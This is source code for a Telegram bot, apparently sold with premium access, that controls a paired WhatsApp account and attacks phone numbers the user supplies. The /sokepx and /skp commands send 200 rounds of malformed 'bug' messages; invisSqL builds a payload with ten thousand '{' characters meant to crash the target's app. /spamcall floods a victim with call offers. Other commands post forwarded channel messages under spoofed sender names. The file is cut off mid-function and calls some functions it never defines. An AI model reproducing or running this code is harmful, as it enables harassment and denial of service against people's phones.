process.stdout.on('error', e => { if (e.code === 'EPIPE') return; });
process.on('uncaughtException', e => { if (e.code !== 'EPIPE') console.error('Uncaught Exception:', e); });

const originalLog = console.log, originalError = console.error, originalInfo = console.info, originalDebug = console.debug, originalWarn = console.warn;
const filters = ['session','SessionEntry','chainKey','messageKeys','ephemeralKeyPair','privKey','pubKey','ratchet','identityKey','baseKey','registrationId','indexInfo','remoteIdentityKey','Buffer','keyId','used','created','closed'];
const shouldBlockLog = a => filters.some(f => a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' ').toLowerCase().includes(f.toLowerCase()));
console.log = (...a) => { if (!shouldBlockLog(a)) originalLog(...a); };
console.error = (...a) => { if (!shouldBlockLog(a)) originalError(...a); };
console.info = (...a) => { if (!shouldBlockLog(a)) originalInfo(...a); };
console.debug = (...a) => { if (!shouldBlockLog(a)) originalDebug(...a); };
console.warn = (...a) => { if (!shouldBlockLog(a)) originalWarn(...a); };

const containsFiltered = t => filters.some(f => t.toLowerCase().includes(f));
const originalWrite = process.stdout.write.bind(process.stdout);
process.stdout.write = (c,e,cb) => {
  if ((typeof c === 'string' && containsFiltered(c)) || (Buffer.isBuffer(c) && containsFiltered(c.toString()))) return;
  originalWrite(c,e,cb);
};
const originalErr = process.stderr.write.bind(process.stderr);
process.stderr.write = (c,e,cb) => {
  if ((typeof c === 'string' && containsFiltered(c)) || (Buffer.isBuffer(c) && containsFiltered(c.toString()))) return;
  originalErr(c,e,cb);
};

const { Telegraf, Markup, Input } = require("telegraf");
const fs = require("fs");
const {
  default: makeWASocket, useMultiFileAuthState, downloadContentFromMessage,
  emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent,
  generateWAMessage, makeInMemoryStore, prepareWAMessageMedia,
  generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus,
  downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata,
  initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions,
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag,
  WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage,
  ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey,
  MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage,
  WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError,
  WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo,
  WA_DEFAULT_EPHEMERAL, WAMediaUpload, jidDecode, mentionedJid, processTime,
  Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype,
  relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket,
  getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion,
  templateMessage, InteractiveMessage, Header
} = require("@whiskeysockets/baileys");
const path = require('path');
const chalk = require("chalk");
const fetch = require('node-fetch');
const { exec } = require("child_process");
const pino = require('pino');
const crypto = require('crypto');
const moment = require('moment-timezone');
const axios = require('axios');
const FormData = require('form-data');
const ytdl = require('ytdl-core');
const yt = require('yt-search');
const { ApiKey, BOT_TOKEN, allowedDevelopers, whatsappChannelId, whatsappChannelLink } = require('./config');
const tdxlol = fs.readFileSync('./lib/tdx.jpeg');
const o = fs.readFileSync('./lib/o.jpg');
const premiumFile = './lib/saturnAccess.json';
const bot = new Telegraf(BOT_TOKEN);

const pluginsPath = path.join(__dirname, "plugins");
if (fs.existsSync(pluginsPath)) {
  fs.readdirSync(pluginsPath)
    .filter(file => file.endsWith(".js"))
    .forEach(file => {
      const fullPath = path.join(pluginsPath, file);
      try {
        require(fullPath)(bot);
        console.log(chalk.hex("#0000FF")(`🔗 Plugin loaded: ${file}`));
      } catch (err) {
        console.error(chalk.red(`❌ Gagal load plugin ${file}: ${err.message}`));
      }
      fs.watchFile(fullPath, () => {
        delete require.cache[require.resolve(fullPath)];
        try {
          require(fullPath)(bot);
          console.log(chalk.green(`🔄 Plugin updated & reloaded: ${file}`));
        } catch (err) {
          console.error(chalk.red(`❌ Gagal reload plugin ${file}: ${err.message}`));
        }
      });
    });
}
const welcomePlugin = require("./plugins/sokep-welcome-bye");
bot.on("new_chat_members", (ctx) => welcomePlugin.handleGroupEvents(ctx, "join"));
bot.on("left_chat_member", ctx => {
  welcomePlugin.handleGroupEvents(ctx, "leave");
});
  
let Sokeppp = null;
let whatsappStatus = false;
const usePairingCode = true;
let maintenanceConfig = {
  maintenance_mode: false,
  message: "Sorry, this script is being fixed by the developer, please wait until it is finished!!"
};
let saturnAccess = [];
let adminList = [];
let ownerList = [];
let deviceList = [];
let allowedBotTokens = [];
let ownerataubukan;
let adminataubukan;
let Premiumataubukan;
let reconnectAttempts = 0;
const cooldowns = new Map();
const COOLDOWN_TIME = 1 * 1000;
const bugCooldowns = new Map();
const DEFAULT_COOLDOWN = 60; 
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "🪐";
        return true;
    } else {
        ownerataubukan = "🪐";
        return false;
    }
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const OWNER_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "🪐";
        return true;
    } else {
        gnymbung = "🪐";
        return false;
    }
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "🪐";
        return true;
    } else {
        adminataubukan = "🪐";
        return false;
    }
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const saveAdmins = () => {
    fs.writeFileSync('./lib/saturnAdmins.json', JSON.stringify(adminList));
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./lib/saturnAdmins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Failed to load admin list:'), error);
        adminList = [];
    }
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        saturnAccess = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Failed to load premium user data:'), error);
        saturnAccess = [];
    }
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const savePremiumUsers = () => {
    fs.writeFileSync(premiumFile, JSON.stringify(saturnAccess, null, 2));
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const addPremiumUser = (userId) => {
    userId = userId.toString();
    if (!saturnAccess.includes(userId)) {
        saturnAccess.push(userId);
        savePremiumUsers();
    }
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const removePremiumUser = (userId) => {
    userId = userId.toString();
    saturnAccess = saturnAccess.filter(id => id !== userId);
    savePremiumUsers();
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const isPremiumUser = (userId) => {
    return saturnAccess.includes(userId.toString());
};      

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const checkPremium = async (skp, next) => {
    if (isPremiumUser(skp.from.id)) {
        await next();
    } else {
        await skp.reply("Sorry... you have to ask the Bot owner for a premium.");
    }
};

const checkOwner = async (skp, next) => {
  if (!OWNER_ID(skp.from.id) && !isOwner(skp.from.id)) {
    return await skp.reply("Sorry, you don't have access to use this command.");
  }
  await next();
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const loadDeviceList = () => {
  try {
    const data = fs.readFileSync(path.join(__dirname, "lib/deviceList.json"));
    deviceList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar device:"), error);
    deviceList = [];
  }
};

const saveDeviceList = () => {
  fs.writeFileSync(
    path.join(__dirname, "lib/deviceList.json"),
    JSON.stringify(deviceList, null, 2)
  );
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const addDeviceToList = (userId, token) => {
    const deviceNumber = deviceList.length + 1;
    deviceList.push({
        number: deviceNumber,
        userId: userId,
        token: token
    });
    saveDeviceList();
    console.log(chalk.hex('#0000FF')('📲 Device added to list.'));
};

const loadUserActivity = () => {
  try {
    const data = fs.readFileSync(path.join(__dirname, "lib/saturnTrack.json"));
    saturnTrack = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat aktivitas pengguna:"), error);
    saturnTrack = {};
  }
};

const recordUserActivity = (userId, userNickname) => {
  const now = moment().tz("Asia/Jakarta").format("YYYY-MM-DD HH:mm:ss");
  saturnTrack[userId] = {
    nickname: userNickname,
    last_seen: now,
  };
  fs.writeFileSync(
    path.join(__dirname, "lib/saturnTrack.json"),
    JSON.stringify(saturnTrack, null, 2)
  );
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

  async function startWhatsapp() {
  const { state, saveCreds } = await useMultiFileAuthState("SaturnSession");
  Sokeppp = makeWASocket({
    auth: state,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
  });
  Sokeppp.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      const reason = lastDisconnect?.error?.output?.statusCode ?? lastDisconnect?.reason;
      whatsappStatus = false;
      console.log('Connection closed:', reason);
    } else if (connection === "open") {
      whatsappStatus = true;
      console.log(chalk.hex('#0000FF')(`Hello world 👋 😎`));
    }
  });
  Sokeppp.ev.on("creds.update", saveCreds);
}

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

 const followNewsletter = async (Sokeppp, newsletterJid, times = 1) => {
  try {
    for (let i = 0; i < times; i++) {
      await Sokeppp.newsletterFollow(newsletterJid);
    }
    console.log("Saturn Is Here🪐.");
  } catch (err) {
    console.warn("🪐", err.message);
  }
};

async function getSessions(skp, number, retryCount = 0) {
  const MAX_RETRIES = 3;
  const chatId = skp.chat.id;
  if (!skp || !chatId || !number) {
    console.error("Error: skp, chatId, atau number tidak terdefinisi!");
    return;
  }

  const sessionDir = "./SaturnSession";
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const Sokeppp = makeWASocket({
    auth: state,
    logger: pino({ level: "silent" }),
    printQRInTerminal: false,
  });

  Sokeppp.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      // Connection closed handling would continue here...
      console.log('WhatsApp connection closed');
    } else if (connection === "open") {
      console.log('WhatsApp connection opened');
    }
  });
  
  Sokeppp.ev.on("creds.update", saveCreds);
}

// Initialize functions
loadAdmins();
loadPremiumUsers();
loadDeviceList();

// Start the Telegram bot
try {
  bot.launch();
  console.log(chalk.hex('#0000FF')('🪐 Saturn Telegram Bot Connected Successfully!'));
} catch (error) {
  console.error(chalk.red('❌ Failed to connect to Telegram:'), error.message);
}

// Graceful shutdown
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// Start the bot
console.log(chalk.hex('#0000FF')('🪐 Saturn Bot Starting...'));
const saturnVideos = [global.thumbnail1, global.thumbnail2, global.thumbnail3, global.thumbnail4];

function randomVideo() {
  return saturnVideos[Math.floor(Math.random() * saturnVideos.length)];
}

const videoUrl = randomVideo();

const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

function generateCaption(cmd, target, progress) {
  const filled = Math.floor(progress / 20); 
  const empty  = 5 - filled;
  const bar    = `[${'█'.repeat(filled)}${' '.repeat(empty)}] ${progress}%`;

  return `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ◦ Target       : ${target}
┃ ◦ Status       : PROCESSING...
┃ ◦ Progress     : ${bar}
┃ ◦ Keterangan   : Bug Deployed
┃ ◦ Warning      : Wait five minutes to attack again
┗━━━━━━━━━━━━━━━━━━━━━━━━━━❍
\`\`\``;
}

function generateSuccessCaption(cmd, target) {
  return `\`\`\`
┏━━━━━━━━━━━━━━━━━━━━━━━━━❍
┃ ◦ Target       : ${target}
┃ ◦ Status       : SUCCESS ✓
┃ ◦ Progress     : [█████] 100%
┃ ◦ Keterangan   : Bug successfully deployed
┃ ◦ Warning      : Cooldown five minutes
┗━━━━━━━━━━━━━━━━━━━━━━━━━━❍
\`\`\``;
}
const prosesrespone = async (target, skp, cmd) => {
  const targetName = target.split("@")[0];

  const sentMessage = await skp.replyWithVideo(videoUrl, {
    caption: generateCaption(cmd, targetName, 0),
    parse_mode: "Markdown",
  });

  for (let progress = 20; progress <= 100; progress += 20) {
    await delay(400);
    try {
      await skp.telegram.editMessageCaption(
        sentMessage.chat.id,
        sentMessage.message_id,
        null,
        generateCaption(cmd, targetName, progress),
        { parse_mode: "Markdown" }
      );
    } catch (err) {
      console.error("Gagal update caption:", err);
    }
  }

  try {
    await skp.telegram.editMessageCaption(
      sentMessage.chat.id,
      sentMessage.message_id,
      null,
      generateSuccessCaption(targetName),
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("Gagal update caption success:", err);
  }
   for (let i = 0; i < 15; i++) {
  console.log(chalk.hex('#0000FF').bold(`┌──────────────────────────────────────────────────────────────────────────┐
│ SUCCESSFULLY ATTACKING TARGET ${target}
└──────────────────────────────────────────────────────────────────────────┘`));
}
};


function getTime() {
  const now = new Date();
  return now.toTimeString().split(" ")[0]; 
}

bot.command("pler", async (skp) => {
  prosesrespone(skp, "saturn");
});

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

const checkWhatsAppConnection = async (skp, next) => {
    if (!whatsappStatus) {
        await skp.reply("WhatsApp belum terhubung. Silakan gunakan command /addpairing");
        return;
    }
    await next();
};

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━
bot.command(['owner', 'creator', 'developer'], async (ctx) => {
    try {
      await ctx.reply('😣😖🥴🤕😫🥹😢😭🤒🫠',
           {
          reply_to_message_id: ctx.message.message_id,
          reply_markup: {
            inline_keyboard: [
              [
                { text: '💬 Chat Developer', url: 'https://t.me/xysokep' }
              ]
            ]
          }
        }
      );
    } catch (err) {
      console.error('❌ Error in /owner or /creator command:', err);
    }
  });

bot.command(["cekidch", "idch"], async (ctx) => {
  try {
    if (!Sokeppp || typeof Sokeppp.newsletterMetadata !== "function") {
      return ctx.reply("⚠️ WhatsApp belum terkoneksi atau belum siap.\nGunakan /status untuk memastikan bot sudah aktif.");
    }

    const text = ctx.message.text?.split(" ")[1] ||
                 ctx.message.reply_to_message?.text;

    if (!text) {
      return ctx.reply("📌 Masukkan link channel WhatsApp!\nContoh:\n/cekidch https://whatsapp.com/channel/abc123");
    }

    if (!text.includes("https://whatsapp.com/channel/")) {
      return ctx.reply("🚫 Link tidak valid!\nGunakan format:\nhttps://whatsapp.com/channel/xxxxx");
    }

    const code = text.split("https://whatsapp.com/channel/")[1].trim();
    const fullLink = `https://whatsapp.com/channel/${code}`;
    const res = await Sokeppp.newsletterMetadata("invite", code);

    const teks = `📡 *WhatsApp Channel Info:*\n\n` +
      `▢ *ID:* \`${res.id}\`\n` +
      `▢ *Nama:* ${res.name}\n` +
      `▢ *Pengikut:* ${res.subscribers.toLocaleString()}\n` +
      `▢ *Status:* ${res.state}\n` +
      `▢ *Verified:* ${res.verification === "VERIFIED" ? "✅ Terverifikasi" : "❌ Tidak"}`;

    await ctx.reply(teks, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "Copy ID", callback_data: `copyid_${res.id}` }
        ]]
      }
    });

  } catch (err) {
    console.error("❌ ERROR /cekidch:", err);
    ctx.reply("🚫 Gagal ambil data channel. Link mungkin salah, atau WhatsApp belum siap.");
  }
});

bot.action(/^copyid_(.+)/, async (ctx) => {
  const id = ctx.match[1];
  await ctx.answerCbQuery("ID disalin!");
  await ctx.reply(`\`${id}\``, { parse_mode: "Markdown" });
});

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

bot.command("addpairing", async (skp) => {
  const phoneNumber = skp.message.text.split(" ")[1];
  
  if (!phoneNumber) {
    return skp.reply("🪐 Cara penggunaan:\n/addpairing <nomor_hp>\n\nContoh: /addpairing 628123456789");
  }
  
  const cleanNumber = phoneNumber.replace(/[^0-9]/g, "");
  
  if (cleanNumber.length < 10) {
    return skp.reply("❌ Nomor tidak valid. Masukkan nomor yang benar.");
  }
  
  try {
    if (!Sokeppp) {
      await startWhatsapp();
      await sleep(2000);
    }
    
    const pairingCode = await Sokeppp.requestPairingCode(cleanNumber);
    
    await skp.reply(
      `🪐 *WhatsApp Pairing Code*\n\n` +
      `📱 Nomor: ${cleanNumber}\n` +
      `🔐 Kode: \`${pairingCode}\`\n\n` +
      `Masukkan kode ini di WhatsApp Anda:\n` +
      `1. Buka WhatsApp\n` +
      `2. Tap titik tiga > Linked Devices\n` +
      `3. Tap "Link a Device"\n` +
      `4. Masukkan kode di atas`,
      { parse_mode: "Markdown" }
    );
    
  } catch (error) {
    console.error("❌ Error generating pairing code:", error);
    await skp.reply("❌ Gagal membuat kode pairing. Coba lagi nanti.");
  }
});

//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━

bot.command("spamcall", checkWhatsAppConnection, checkOwner, async (skp) => {
  const q = skp.message.text.split(" ")[1];

  if (!q) {
    return skp.reply("🪐 Contoh penggunaan:\n/spamcall 628xxxx");
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await prosesrespone(target, skp);
  for (let i = 0; i < 50; i++) {
    await sendOfferCall(target);
    await sleep(3000);
  }
});


//━━━━━━━━━━━━━━━sokep official━━━━━━━━━━━━━━━━━━━
bot.command(["upteks", "upchat"], async (skp) => {
  const input = skp.message.text?.split(" ").slice(1).join(" ").trim();
  const channel = global.idch;
  const usedCommand = skp.message.text?.split(" ")[0].toLowerCase(); // /upteks atau /upchat

  if (!input || !input.includes("|")) {
    return skp.reply(
      `⚠️ Format salah!\n\nContoh:\n\`${usedCommand} Nama Anda|Isi Pesan\``,
      { parse_mode: "Markdown" }
    );
  }

  const [namaPengirim, ...pesanArray] = input.split("|");
  const pengirim = namaPengirim.trim();
  const isiPesan = pesanArray.join("|").trim();

  if (!isiPesan) {
    return skp.reply("⚠️ Isi pesan tidak boleh kosong.");
  }

  const message = {
    extendedTextMessage: {
      text: isiPesan,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: channel,
          newsletterName: pengirim,
          serverMessageId: -1
        }
      }
    }
  };

  try {
    const encoded = proto.Message.encode(message).finish();

    await Sokeppp.query({
      tag: 'message',
      attrs: { to: channel, type: 'text' },
      content: [{ tag: 'plaintext', attrs: {}, content: encoded }]
    });

    const jenis = usedCommand === "/upchat" ? "chat" : "teks";
    return skp.reply(`✅ Pesan ${jenis} berhasil dikirim ke *WhatsApp Channel*.`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Close", callback_data: "close" }]
        ]
      }
    });
  } catch (err) {
    console.error("❌ Error kirim pesan:", err);
    return skp.reply("❌ Gagal mengirim pesan.");
  }
});



const { execSync } = require("child_process");
const ffmpeg = require("fluent-ffmpeg");
const ffmpegInstaller = require("@ffmpeg-installer/ffmpeg");

ffmpeg.setFfmpegPath(ffmpegInstaller.path);

const downloadTelegramFile = require("./lib/downloadTelegram");

bot.command("upaudio", async (skp) => {
  const reply = skp.message?.reply_to_message;
  const channel = global.idch;

  if (!reply || (!reply.audio && !reply.voice)) {
    return skp.reply("Reply to *audio/voice note* with this command.\nExample:`/upaudio Your Name`", { parse_mode: "Markdown" });
  }

  const inputName = skp.message.text?.split(" ").slice(1).join(" ").trim();
  if (!inputName) return skp.reply("Reply to *audio/voice note* with this command.\nExample:`/upaudio Your Name`", { parse_mode: "Markdown" });

  try {
    const fileId = reply.audio?.file_id || reply.voice?.file_id;
    const inputPath = await downloadTelegramFile(bot.telegram, fileId, "./tmp");
    const outputPath = inputPath.replace(path.extname(inputPath), ".ogg");

    await convertToOpus(inputPath, outputPath);

    await Sokeppp.sendMessage(channel, {
      audio: { url: outputPath },
      mimetype: "audio/ogg; codecs=opus",
      ptt: true,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: channel,
          newsletterName: inputName,
          serverMessageId: -1
        }
      }
    });

    await skp.reply("✅ Audio berhasil dikirim ke channel.");

    fs.unlinkSync(inputPath);
    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error("❌ Error:", err);
    await skp.reply("⚠️ Gagal mengirim audio.");
  }
});

function convertToOpus(input, output) {
  return new Promise((resolve, reject) => {
    ffmpeg(input)
      .noVideo()
      .audioCodec("libopus")
      .format("ogg")
      .on("end", resolve)
      .on("error", reject)
      .save(output);
  });
}



bot.command("upimage", async (skp) => {
  const reply = skp.message?.reply_to_message;
  const channel = global.idch;
  if (!reply || (!reply.photo && !reply.document)) {
    return skp.reply(
      "Use format:`/upimage <name>|<caption>`",
      { parse_mode: "Markdown" }
    );
  }

  const input = skp.message.text?.split(" ").slice(1).join(" ").trim();
  if (!input || !input.includes("|")) {
    return skp.reply(
      "Use format:\n`/upimage <name>|<caption>`",
      { parse_mode: "Markdown" }
    );
  }

  const [namaPengirim, ...captionParts] = input.split("|");
  const caption = captionParts.join("|").trim();
  const pengirim = namaPengirim.trim();

  try {
    const fileId = reply.photo?.[reply.photo.length - 1]?.file_id || reply.document?.file_id;
    const filePath = await downloadTelegramFile(bot.telegram, fileId, "./tmp");

    await Sokeppp.sendMessage(channel, {
      image: { url: filePath },
      caption,
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: channel,
          newsletterName: pengirim,
          serverMessageId: -1
        }
      }
    });

    await skp.reply("✅ Gambar berhasil dikirim ke channel.");
    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("❌ upimage error:", err);
    await skp.reply("⚠️ Gagal mengirim gambar.");
  }
});

bot.command("upvideo", async (skp) => {
  const reply = skp.message?.reply_to_message;
  const channel = global.idch;

  if (!reply || !reply.video && !reply.document) {
    return skp.reply(
      "Example:`/upvideo Your Name|Caption`",
      { parse_mode: "Markdown" }
    );
  }

  const input = skp.message.text?.split(" ").slice(1).join(" ").trim();
  if (!input || !input.includes("|")) {
    return skp.reply(
      "Example:`/upvideo Your Name|Caption`",
      { parse_mode: "Markdown" }
    );
  }

  const [namaPengirim, ...captionParts] = input.split("|");
  const caption = captionParts.join("|").trim();
  const pengirim = namaPengirim.trim();

  try {
    const fileId = reply.video?.file_id || reply.document?.file_id;
    const filePath = await downloadTelegramFile(bot.telegram, fileId, "./tmp");

    await Sokeppp.sendMessage(channel, {
      video: { url: filePath },
      caption,
      mimetype: "video/mp4",
      contextInfo: {
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: channel,
          newsletterName: pengirim,
          serverMessageId: -1
        }
      }
    });

    await skp.reply("✅ Video berhasil dikirim ke channel.");
    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("❌ upvideo error:", err);
    await skp.reply("⚠️ Gagal mengirim video.");
  }
});

bot.command("sokepx", checkWhatsAppConnection, checkPremium, async skp => {
  try {
    const text = skp.message.text;
    const cmd = text.split(" ")[0].slice(1);
    const q = text.split(" ")[1];

    if (!q || q.length < 9 || !/\d/.test(q)) {
      return await skp.reply(`Enter a valid number. Example: /${cmd} 628xxxxxx`);
    }

    let raw = q.replace(/\D/g, '');
    if (raw.length < 8) {
      return await skp.reply(`❌ Nomor terlalu pendek. Minimal 8 digit.`);
    }
    if (raw.startsWith("0")) {
      return await skp.reply(`❌ Format salah. Nomor tidak boleh dimulai dengan 0. Gunakan format internasional seperti 628xxxxxx`);
    }

    const target = raw + "@s.whatsapp.net";

    await prosesrespone(target, skp);

    setImmediate(async () => {
      for (let i = 0; i < 200; i++) {
        try {
          await invisSqL(target);
          await sleep(1000);
          await invisSqL(target);
          await sleep(1000);
        } catch (err) {
          console.log("Failed saturncore:", err);
        }
      }
    });

  } catch (err) {
    console.error("Error in saturncore command:", err);
    await skp.reply("An error occurred. Please try again later or contact the owner.");
  }
});

async function invisSqL(target) {
  const Node = [
    {
      tag: "bot",
      attrs: {
        biz_bot: "1"
      }
    }
  ];

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          header: {
            title: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚",
            hasMediaAttachment: false,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "NzsD1qquqQAeJ3MecYvGXETNvqxgrGH2LaxD8ALpYVk=",
              fileLength: "11887",
              height: 1080,
              width: 1080,
              mediaKey: "H/rCyN5jn7ZFFS4zMtPc1yhkT7yyenEAkjP0JLTLDY8=",
              fileEncSha256: "RLs/w++G7Ria6t+hvfOI1y4Jr9FDCuVJ6pm9U3A2eSM=",
              directPath: "/v/t62.7118-24/41030260_9800293776747367_945540521756953112_n.enc?ccb=11-4&oh=01_Q5Aa1wGdTjmbr5myJ7j-NV5kHcoGCIbe9E4r007rwgB4FjQI3Q&oe=687843F2&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1750124469",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEAAwEBAAAAAAAAAAAAAAAAAQMEBQYBAQEBAQAAAAAAAAAAAAAAAAACAQP/2gAMAwEAAhADEAAAAPMgAAAAAb8F9Kd12C9pHLAAHTwWUaubbqoQAA3zgHWjlSaMswAAAAAAf//EACcQAAIBBAECBQUAAAAAAAAAAAECAwAREhMxBCAQFCJRgiEwQEFS/9oACAEBAAE/APxfKpJBsia7DkVY3tR6VI4M5Wsx4HfBM8TgrRWPPZj9ebVPK8r3bvghSGPdL8RXmG251PCkse6L5DujieU2QU6TcMeB4HZGLXIB7uiZV3Fv5qExvuNremjrLmPBba6VEMkQIGOHqrq1VZbKBj+u0EigSODWR96yb3NEk8n7n//EABwRAAEEAwEAAAAAAAAAAAAAAAEAAhEhEiAwMf/aAAgBAgEBPwDZsTaczAXc+aNMWsyZBvr/AP/EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQMBAT8AT//Z",
              contextInfo: {
                mentionedJid: [target],
                participant: target,
                remoteJid: target,
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742,
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                }
              },
              scansSidecar: "E+3OE79eq5V2U9PnBnRtEIU64I4DHfPUi7nI/EjJK7aMf7ipheidYQ==",
              scanLengths: [2071, 6199, 1634, 1983],
              midQualityFileSha256: "S13u6RMmx2gKWKZJlNRLiLG6yQEU13oce7FWQwNFnJ0="
            }
          },
          body: {
            text: "𒑡 𝐅𝐧𝐗 ᭧ 𝐃⍜𝐦𝐢𝐧𝐚𝐭𝐢⍜𝐍᭾៚"
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(10000)
          }
        }
      }
    }
  }, {});

  await Sokeppp.relayMessage(target, msg.message, {
    participant: { jid: target },
    additionalNodes: Node,
    messageId: msg.key.id
  });
}


bot.command("skp", checkWhatsAppConnection, checkPremium, async skp => {
  try {
    const text = skp.message.text;
    const cmd = text.split(" ")[0].slice(1);
    const q = text.split(" ")[1];

    if (!q || q.length < 9 || !/\d/.test(q)) {
      return await skp.reply(`Enter a valid number. Example: /${cmd} 628xxxxxx`);
    }

    let raw = q.replace(/\D/g, '');
    if (raw.length < 8) {
      return await skp.reply(`❌ Nomor terlalu pendek. Minimal 8 digit.`);
    }
    if (raw.startsWith("0")) {
      return await skp.reply(`❌ Format salah. Nomor tidak boleh dimulai dengan 0. Gunakan format internasional seperti 628xxxxxx`);
    }

    const target = raw + "@s.whatsapp.net";

    await prosesrespone(target, skp);

    setImmediate(async () => {
      for (let i = 0; i < 200; i++) {
        try {
          await Vi3wsStath(target);
          await sleep(1000);
          await InVisiOneMess(target);
          await sleep(1000);
        } catch (err) {
          console.log("Failed saturncore:", err);
        }
      }
    });

